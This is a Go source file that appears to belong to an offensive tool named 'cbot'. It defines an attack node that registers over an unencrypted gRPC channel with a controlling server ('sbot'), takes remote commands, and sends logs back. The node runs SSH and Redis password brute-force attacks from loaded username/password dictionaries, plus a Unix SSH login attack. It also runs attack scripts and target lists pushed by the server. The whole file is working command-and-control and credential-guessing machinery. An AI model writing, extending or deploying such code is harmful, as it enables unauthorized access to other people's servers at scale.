package node

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/attack/ascript"
	"github.com/cbot/attack/bruteforce"
	"github.com/cbot/attack/unix"
	"github.com/cbot/client"
	"github.com/cbot/logstream"
	"github.com/cbot/targets/local"
	"github.com/cbot/targets/source"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

type Node struct {
	nodeId string

	cfg *Config

	grpcClient *grpc.ClientConn

	nodeClient *client.NodeClient

	cmdClient *client.CmdClient

	logStreamClient *client.LogStreamClient

	spool *source.SourcePool

	attackTasks *attack.AttackTasks

	nodeInfo *local.NodeInfo

	logStream *logstream.LogStream

	dictPools map[string]*bruteforce.DictPool

	unixAttack *unix.UnixSSHLoginAttack
}

func NewNode(cfg *Config) *Node {

	nodeInfo := local.GetNodeInfo()
	spool := source.NewSourcePool()

	attackTasks := attack.NewAttackTasks(&attack.Config{
		MaxThreads:            cfg.MaxThreads,
		SourceCapacity:        cfg.SourceCapacity,
		AttackProcessCapacity: cfg.AttackProcessCapacity,
		SBotHost:              cfg.SbotHost,
		SBotPort:              cfg.SbotFileServerPort,
	}, nodeInfo, spool)

	dictpools := map[string]*bruteforce.DictPool{
		"ssh":   bruteforce.NewDictPool(),
		"redis": bruteforce.NewDictPool(),
	}

	attackTasks.AddAttack(bruteforce.NewSSHBruteforceAttack(dictpools["ssh"], attackTasks))
	attackTasks.AddAttack(bruteforce.NewRedisBruteforceAttack(dictpools["redis"], attackTasks))

	return &Node{
		cfg:         cfg,
		spool:       spool,
		attackTasks: attackTasks,
		nodeInfo:    nodeInfo,
		logStream:   logstream.NewLogStream(),
		dictPools:   dictpools,
		unixAttack:  unix.NewUnixSSHLoginAttack(attackTasks),
	}

}

func (n *Node) GetNodeInfo() *local.NodeInfo {

	return n.nodeInfo
}

func (n *Node) Start() error {

	var err error

	//connect to sbot
	n.grpcClient, err = grpc.Dial(fmt.Sprintf("%s:%d", n.cfg.SbotHost, n.cfg.SbotRPCPort),
		grpc.WithTransportCredentials(insecure.NewCredentials()))

	if err != nil {

		return fmt.Errorf("Cannot connect to sbot:%v", err)
	}

	n.logStreamClient = client.NewLogStreamClient(n, n.grpcClient, n.logStream)

	//connect to sbot,and create node
	n.nodeClient = client.NewNodeClient(n, n.grpcClient)
	n.nodeId, err = n.nodeClient.CreateNode()

	if err != nil {

		return fmt.Errorf("Create node failed:%v", err)
	}

	n.cmdClient, err = client.NewCmdClient(n, n.grpcClient)
	if err != nil {
		return fmt.Errorf("Create command node client failed:%v", err)
	}

	//setup command client to receive cmd from sbot
	if err = n.cmdClient.Start(); err != nil {

		return fmt.Errorf("Cannot start command client to receive cmd from sbot:%v", err)
	}

	//setup logstream client to send log to sbot
	if err = n.logStreamClient.Start(); err != nil {

		return fmt.Errorf("Cannot start logstream client to send log to sbot:%v", err)
	}

	//setup attack tasks
	n.attackTasks.Start()

	//setup unix attack
	n.unixAttack.Start()

	n.waitAttackProcess()

	return nil
}

func (n *Node) Stop() {

	n.grpcClient.Close()
}

func (n *Node) NodeId() string {

	return n.nodeId
}

func (n *Node) AddAttackSource(name string, types []string, content []byte) error {

	s, err := source.NewScriptSourceFromContent(n.spool, name, types, content)

	if err != nil {

		return err
	}

	n.spool.StartSource(s)

	return nil
}

func (n *Node) AddAttack(name string, attackType string, defaultProto string, defaultPort int, content []byte) error {

	att, err := ascript.NewAttackScriptFromContent(n.attackTasks, name, attackType, defaultPort, defaultProto, content)

	if err != nil {

		return err
	}

	n.attackTasks.AddAttack(att)

	return nil
}

func (n *Node) AddDict(name string, users []string, passwds []string) error {

	dictpool, ok := n.dictPools[name]

	if !ok {

		return fmt.Errorf("Cannot find dictory pool for name:%s", name)
	}

	dictpool.Add(users, passwds)

	return nil
}
